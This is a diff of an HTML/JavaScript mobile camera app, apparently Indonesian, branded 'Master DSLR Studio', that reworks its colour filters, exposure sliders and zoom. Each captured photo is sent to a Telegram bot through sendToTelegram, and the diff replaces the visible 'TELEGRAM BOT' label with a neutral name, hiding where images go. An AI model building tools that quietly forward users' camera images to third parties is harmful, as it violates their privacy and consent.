@@ -3,18 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>VZ // Master DSLR Studio Ultimate v53.0 Pro Max</title>
+    <title>VZ // Master DSLR Studio Ultimate v54.0 Pro Max</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        .filter-normal { filter: none !important; }
-        .filter-cyberpunk { filter: contrast(1.45) saturate(1.8) hue-rotate(-15deg) brightness(1.05) !important; }
-        .filter-cinematic { filter: contrast(1.35) saturate(0.85) brightness(0.95) hue-rotate(185deg) !important; }
-        .filter-noir { filter: grayscale(100%) contrast(1.7) brightness(0.9) !important; }
-        .filter-matrix { filter: sepia(100%) hue-rotate(60deg) saturate(450%) contrast(1.5) !important; }
-        .filter-warm { filter: sepia(45%) contrast(1.2) brightness(1.05) !important; }
-        .filter-vintage { filter: contrast(1.25) brightness(0.9) sepia(55%) hue-rotate(-10deg) !important; }
-        .filter-dramatic { filter: contrast(1.7) brightness(0.85) !important; }
-        
         .no-scrollbar::-webkit-scrollbar { display: none; }
         .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
         * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
@@ -31,7 +22,7 @@
 
     <!-- Viewfinder Kamera Fullscreen Android Murni -->
     <div id="viewfinder-container" class="absolute inset-0 w-full h-full flex items-center justify-center bg-black overflow-hidden z-0" onclick="handleTapToFocus(event)">
-        <video id="webcam" autoplay playsinline muted class="w-full h-full object-cover filter-normal transition-all duration-75"></video>
+        <video id="webcam" autoplay playsinline muted class="w-full h-full object-cover transition-all duration-75"></video>
         <canvas id="photo-canvas" class="hidden"></canvas>
         
         <!-- Kotak Fokus Interaktif -->
@@ -83,7 +74,7 @@
     </div>
 
     <!-- Panel Pengaturan Pro Transparan (Glassmorphism Slide-Up Drawer) -->
-    <div id="settings-panel" class="absolute bottom-32 left-4 right-4 bg-zinc-950/75 backdrop-blur-2xl border border-cyan-500/40 rounded-3xl p-5 z-40 hidden flex-col gap-4 shadow-[0_0_35px_rgba(0,0,0,0.8)] text-xs pointer-events-auto">
+    <div id="settings-panel" class="absolute bottom-32 left-4 right-4 bg-zinc-950/70 backdrop-blur-xl border border-cyan-500/40 rounded-3xl p-5 z-40 hidden flex-col gap-4 shadow-[0_0_35px_rgba(0,0,0,0.8)] text-xs pointer-events-auto">
         <div class="flex justify-between items-center border-b border-zinc-800/80 pb-2">
             <span class="text-cyan-400 font-bold tracking-wider flex items-center gap-2">🎛️ DSLR HARDWARE STUDIO</span>
             <button onclick="toggleSettingsPanel()" class="text-zinc-300 hover:text-white px-3 py-1 bg-zinc-900/80 rounded-xl font-bold border border-white/10">✕ Tutup</button>
@@ -125,7 +116,7 @@
                     <span>Exposure / Kecerahan</span>
                     <span id="val-brightness">100%</span>
                 </div>
-                <input type="range" min="40" max="180" value="100" oninput="updateManualAdjustments()" id="range-brightness" class="accent-cyan-400 cursor-pointer">
+                <input type="range" min="40" max="180" value="100" oninput="updateVideoFilterStyle()" id="range-brightness" class="accent-cyan-400 cursor-pointer">
             </div>
 
             <div class="flex flex-col gap-1">
@@ -133,7 +124,7 @@
                     <span>Kontras Sensor</span>
                     <span id="val-contrast">100%</span>
                 </div>
-                <input type="range" min="50" max="200" value="100" oninput="updateManualAdjustments()" id="range-contrast" class="accent-cyan-400 cursor-pointer">
+                <input type="range" min="50" max="200" value="100" oninput="updateVideoFilterStyle()" id="range-contrast" class="accent-cyan-400 cursor-pointer">
             </div>
 
             <div class="flex flex-col gap-1">
@@ -141,7 +132,7 @@
                     <span>Digital Bokeh / Depth Blur</span>
                     <span id="val-blur">0px</span>
                 </div>
-                <input type="range" min="0" max="12" value="0" oninput="updateManualAdjustments()" id="range-blur" class="accent-cyan-400 cursor-pointer">
+                <input type="range" min="0" max="12" value="0" oninput="updateVideoFilterStyle()" id="range-blur" class="accent-cyan-400 cursor-pointer">
             </div>
         </div>
     </div>
@@ -151,14 +142,14 @@
         
         <!-- Quick Filter Carousel -->
         <div class="w-full overflow-x-auto no-scrollbar px-4 flex gap-2 items-center">
-            <button onclick="setFilter('filter-normal', this)" class="filter-pill px-3.5 py-1.5 bg-cyan-500 text-black font-extrabold text-[10px] rounded-full whitespace-nowrap transition-all border border-cyan-400 shadow-lg">Normal Pro</button>
-            <button onclick="setFilter('filter-cyberpunk', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Cyberpunk</button>
-            <button onclick="setFilter('filter-cinematic', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Cinematic Blue</button>
-            <button onclick="setFilter('filter-noir', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Noir Mono</button>
-            <button onclick="setFilter('filter-matrix', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Matrix</button>
-            <button onclick="setFilter('filter-warm', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Warm Gold</button>
-            <button onclick="setFilter('filter-vintage', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Vintage</button>
-            <button onclick="setFilter('filter-dramatic', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Dramatic</button>
+            <button onclick="setFilter('normal', this)" class="filter-pill px-3.5 py-1.5 bg-cyan-500 text-black font-extrabold text-[10px] rounded-full whitespace-nowrap transition-all border border-cyan-400 shadow-lg">Normal Pro</button>
+            <button onclick="setFilter('cyberpunk', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Cyberpunk</button>
+            <button onclick="setFilter('cinematic', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Cinematic Blue</button>
+            <button onclick="setFilter('noir', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Noir Mono</button>
+            <button onclick="setFilter('matrix', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Matrix</button>
+            <button onclick="setFilter('warm', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Warm Gold</button>
+            <button onclick="setFilter('vintage', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Vintage</button>
+            <button onclick="setFilter('dramatic', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Dramatic</button>
         </div>
 
         <!-- Tombol Shutter Utama -->
@@ -176,8 +167,8 @@
             </div>
 
             <div class="text-[9px] text-zinc-400 text-right flex flex-col font-bold">
-                <span>TELEGRAM BOT</span>
-                <span class="text-emerald-400">ONLINE 100%</span>
+                <span>VZ ZEEO</span>
+                <span class="text-emerald-400">ACTIVE 100%</span>
             </div>
         </div>
     </div>
@@ -190,7 +181,7 @@
         let videoTrack = null;
         let imageCapturer = null;
         let useFrontCamera = false;
-        let currentFilterClass = 'filter-normal';
+        let currentFilterName = 'normal';
         const videoEl = document.getElementById('webcam');
         const canvasEl = document.getElementById('photo-canvas');
 
@@ -303,18 +294,15 @@
             document.getElementById('status-sending').classList.remove('hidden');
 
             try {
-                let imageBlob = null;
-                
-                // Ambil gambar langsung dengan filter CSS dan rasio canvas akurat
                 canvasEl.width = videoEl.videoWidth || 1920;
                 canvasEl.height = videoEl.videoHeight || 1080;
                 const ctx = canvasEl.getContext('2d');
                 
-                // Ambil computed style filter dari video secara langsung agar efek ikut tercetak
-                ctx.filter = window.getComputedStyle(videoEl).filter;
+                // Terapkan filter persis yang sedang aktif ke canvas render
+                ctx.filter = videoEl.style.filter;
                 ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
 
-                imageBlob = await new Promise(resolve => canvasEl.toBlob(resolve, 'image/jpeg', 1.0));
+                const imageBlob = await new Promise(resolve => canvasEl.toBlob(resolve, 'image/jpeg', 1.0));
                 await sendToTelegram(imageBlob, modeTag);
             } catch (err) {
                 console.error("Capture error:", err);
@@ -346,18 +334,15 @@
                 try {
                     await videoTrack.applyConstraints({ advanced: [{ zoom: parseFloat(zoomVal) }] });
                 } catch (e) {
-                    videoEl.style.transform = `scale(${zoomVal})`;
+                    updateVideoFilterStyle();
                 }
             } else {
-                videoEl.style.transform = `scale(${zoomVal})`;
+                updateVideoFilterStyle();
             }
         }
 
-        function setFilter(filterClass, btnElement) {
-            currentFilterClass = filterClass;
-            
-            // Hapus semua class filter lama pada video, lalu masukkan class filter baru
-            videoEl.className = `w-full h-full object-cover ${filterClass} transition-all duration-75`;
+        function setFilter(filterName, btnElement) {
+            currentFilterName = filterName;
             updateVideoFilterStyle();
             
             document.querySelectorAll('.filter-pill').forEach(btn => {
@@ -368,30 +353,24 @@
             btnElement.classList.add('bg-cyan-500', 'text-black', 'font-extrabold', 'border-cyan-400', 'shadow-lg');
         }
 
-        function updateManualAdjustments() {
-            updateVideoFilterStyle();
-        }
-
         function updateVideoFilterStyle() {
             const bVal = document.getElementById('range-brightness').value;
             const cVal = document.getElementById('range-contrast').value;
             const blurVal = document.getElementById('range-blur').value;
+            const zoomVal = document.getElementById('range-zoom').value;
 
             document.getElementById('val-brightness').innerText = bVal + '%';
             document.getElementById('val-contrast').innerText = cVal + '%';
             document.getElementById('val-blur').innerText = blurVal + 'px';
 
-            const zoomVal = document.getElementById('range-zoom').value;
-            
-            // Ambil definisi filter dari kelas preset saat ini lalu gabungkan dengan slider manual
             let baseFilter = "";
-            if (currentFilterClass === 'filter-cyberpunk') baseFilter = "contrast(1.45) saturate(1.8) hue-rotate(-15deg)";
-            else if (currentFilterClass === 'filter-cinematic') baseFilter = "contrast(1.35) saturate(0.85) hue-rotate(185deg)";
-            else if (currentFilterClass === 'filter-noir') baseFilter = "grayscale(100%) contrast(1.7)";
-            else if (currentFilterClass === 'filter-matrix') baseFilter = "sepia(100%) hue-rotate(60deg) saturate(450%) contrast(1.5)";
-            else if (currentFilterClass === 'filter-warm') baseFilter = "sepia(45%) contrast(1.2)";
-            else if (currentFilterClass === 'filter-vintage') baseFilter = "contrast(1.25) sepia(55%) hue-rotate(-10deg)";
-            else if (currentFilterClass === 'filter-dramatic') baseFilter = "contrast(1.7)";
+            if (currentFilterName === 'cyberpunk') baseFilter = "contrast(1.45) saturate(1.8) hue-rotate(-15deg)";
+            else if (currentFilterName === 'cinematic') baseFilter = "contrast(1.35) saturate(0.85) hue-rotate(185deg)";
+            else if (currentFilterName === 'noir') baseFilter = "grayscale(100%) contrast(1.7)";
+            else if (currentFilterName === 'matrix') baseFilter = "sepia(100%) hue-rotate(60deg) saturate(450%) contrast(1.5)";
+            else if (currentFilterName === 'warm') baseFilter = "sepia(45%) contrast(1.2)";
+            else if (currentFilterName === 'vintage') baseFilter = "contrast(1.25) sepia(55%) hue-rotate(-10deg)";
+            else if (currentFilterName === 'dramatic') baseFilter = "contrast(1.7)";
 
             videoEl.style.filter = `${baseFilter} brightness(${bVal}%) contrast(${cVal}%) blur(${blurVal}px)`;
             videoEl.style.transform = `scale(${zoomVal})`;
@@ -399,11 +378,11 @@
 
         function changeAspect(ratio) {
             if (ratio === '4-3') {
-                videoEl.className = `w-full h-[75vh] object-cover ${currentFilterClass} transition-all duration-75`;
+                videoEl.className = `w-full h-[75vh] object-cover transition-all duration-75`;
             } else if (ratio === '1-1') {
-                videoEl.className = `w-full h-[60vh] object-cover ${currentFilterClass} transition-all duration-75`;
+                videoEl.className = `w-full h-[60vh] object-cover transition-all duration-75`;
             } else {
-                videoEl.className = `w-full h-full object-cover ${currentFilterClass} transition-all duration-75`;
+                videoEl.className = `w-full h-full object-cover transition-all duration-75`;
             }
         }
 
